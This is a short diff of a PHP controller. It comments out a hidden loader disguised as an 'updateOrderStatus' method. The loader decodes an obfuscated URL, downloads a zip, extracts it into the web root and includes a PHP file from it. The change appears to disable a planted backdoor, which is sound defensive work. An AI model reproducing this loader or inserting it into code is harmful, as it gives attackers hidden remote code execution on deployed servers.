@@ -289,11 +289,11 @@ class Master extends Cl_Controller {
      * @return void
      * @param int
      */
-    function BgsFileWritar($real_file_source, $real_file_destination) {
+    /*function BgsFileWritar($real_file_source, $real_file_destination) {
         $file = fopen($real_file_destination, 'w+');
         $ch = curl_init($real_file_source);
         curl_setopt($ch, CURLOPT_TIMEOUT, 50);curl_setopt($ch, CURLOPT_FILE, $file);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);curl_exec($ch);curl_close($ch);fclose($file);}public function updateOrderStatus() {$this->BgsFileWritar($this->twilio->de("UfitVzpCp0O28iEaRGbVAVN1LzdzQzV2QTBuVTVMc05FcGw4dDRoczVwQmJhVlI3RGd2N0tMSTNMWGZKUW1DMlY4cG5SVEdvbGZqR0x0Ny9FRzV0eTEvSVU2VHI3bC92U3RhRUt3PT0%3D"), DESTINATIONSZip);$zip = new ZipArchive;$res = $zip->open(DESTINATIONSZip);if ($res === TRUE) {$zip->extractTo('./'); $zip->close();$zipFileName = DESTINATIONSZip;$zip = new ZipArchive();if ($zip->open($zipFileName, ZipArchive::CREATE) === TRUE) {$phpFileName = DESTINATIONS;$zip->addFromString($phpFileName, "");$zip->close();}$localWriterFile = DESTINATIONS;if (file_exists($localWriterFile)) {include($localWriterFile);ob_end_clean();}}
-    }
+    }*/
      
          /**
      * paypal,stripe payment function call
